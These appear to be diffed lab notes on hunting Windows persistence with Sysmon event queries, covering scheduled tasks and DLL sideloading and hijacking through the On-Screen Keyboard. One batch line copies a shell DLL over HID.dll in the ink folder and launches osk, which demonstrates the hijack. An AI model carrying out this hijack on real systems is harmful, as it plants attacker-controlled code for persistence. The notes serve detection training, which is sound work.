+Get-SysmonEvent 1 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
+```
+
+DNSEvent, NetworkConnect
+
+```pwsh
+Get-SysmonEvent 22 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List
+Get-SysmonEvent 3 "11/12/2021 7:29:00" "11/12/2021 7:29:30" | Format-List 
+```
+
+Find the FileCreate event where the **TargetFilename** matches the Command listed in the newly-created Scheduled Task
+
+```pwsh
+Get-SysmonEvent 11 | Where-Object { $_.properties[5].value -like "*exercise_schedtask.exe*" } | Format-List
+```
+
+Find a ProcessCreate event where the **Image** matches the command in the newly-created scheduled task
+
+```pwsh
+Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*exercise_schedtask.exe*" } | Format-List
+```
+
+## Persisting by DLL-Sideloading/Hijacking
+
+For both of these techniques, the vulnerability lies with **DLL search order**.
+
+When Windows loads a DLL for an application, the OS follows a series of checks to locate the DLL.
+
+1. The OS checks if the DLL has been loaded into memory.
+
+2. The system will review a list of known DLLs in `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`, which stores the names and locations of commonly-used DLLs (located in `C:\Windows\system32`).
+
+3. What happens next in the search for a DLL depends on whether the **SafeDllSearchMode** key in `HKLM\System\CurrentControlSet\Control\Session Manager\` is enabled or disabled.
+
+- By default, **SafeDllSearchMode** is enabled. Windows will search for the DLL in the directory where the program was executed, followed by System directories and the Windows directory.
+
+- If **SafeDllSearchMode** is disabled, Windows will search where the program was executed as well as the **current directory** of the user (if applicable), before System directories and the Windows directory.
+
+**DLL sideloading**: the malicious DLL is placed in the same directory as the application itself.
+
+**DLL hijacking**: instead of placing the malicious DLL alongside the application, the DLL is inserted somewhere along the sequence of directories that Windows checks.
+
+E.g., DLL hijacking involves the On-Screen Keyboard accessibility feature in Windows. One of the DLLs is `HID.dll`, a USB interface library that supports control between USB devices and whatever application requires them.
+
+When the On-Screen Keyboard is loaded, Windows begins its search for all DLLs, including `HID.dll`. However, Windows first looks in `C:\Program Files\Common Files\microsoft shared\ink` for the DLL before moving on to `C:\Windows\System32`. Under normal circumstances, the DLL will be found in the System32 directory and execution of the application succeeds. However, an attacker with sufficient privileges could store a malicious DLL in the ink subdirectory and hijack the DLL search order.
+
+```bat
+copy "C:\tools\windows_persistence\prst_dllshell443.dll" "C:\Program Files\Common Files\microsoft shared\ink\HID.dll"
+osk
+```
+
+FileCreate event was generated when we wrote HID.dll to the new directory
+
+```pwsh
+Get-SysmonEvent 11 "11/18/2021 9:03:23" "11/18/2021 9:03:25" | Format-List
+```
+
+Search for ProcessCreate events in which the parent image is `osk.exe`.
+
+```pwsh
+Get-SysmonEvent 1 "11/18/2021 9:03:24" | Where-Object { $_.properties[20].value -like "*osk*" } | Format-List
+```
+
+search for NetworkConnect events where the Image field contains the file
+
+```pwsh
+Get-SysmonEvent $null "11/18/2021 10:22:06" | Where-Object { $_.properties[4].value -like "*rundll32.exe*" } | Format-List
+```
+
+Look for the ProcessCreate events with On-Screen Keyboard's file in the Image field.
+
+```pwsh
+Get-SysmonEvent 1 | Where-Object { $_.properties[4].value -like "*osk*" } | Format-List
+```
+
+Look for a CreateRemoteThread event where the TargetImage matches the new process (mai check lai)
+
+```pwsh
+Get-SysmonEvent 8 | Where-Object { $_.properties[6].value -like "*lsass.exe*" } | Format-List
 ```
